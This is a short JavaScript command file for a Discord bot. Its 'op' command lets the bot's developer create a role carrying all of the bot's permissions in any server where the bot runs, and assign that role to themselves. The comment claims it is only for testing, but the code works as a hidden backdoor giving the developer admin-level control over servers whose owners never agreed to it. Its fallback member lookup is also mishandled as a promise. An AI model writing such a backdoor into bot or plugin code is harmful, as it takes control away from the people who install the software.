// this command is NOT meant to be abused. Its strictly for testing purposes

module.exports = {
    name: 'op',
    description: 'Gives admin perms to the dev',
    aliases: ['givemoduwu'], // ._.
    category: 'dev',
    permissions: 'BOT_DEV',
    run (client, message, args) {
        message.guild.roles.create({
            name: 'FadBot Dev',
            color: 0xFFFF00,
            position: message.guild.me.roles.highest.position - 1,
            permissions: message.guild.me.permissions
        }).then(role => {
            const member = message.member || message.guild.members.fetch(message.author.id)

            member.roles.add(role).then(() => message.reply('Given'))
        })
        .catch(e => message.reply('Failed to give role xd'))
    }
}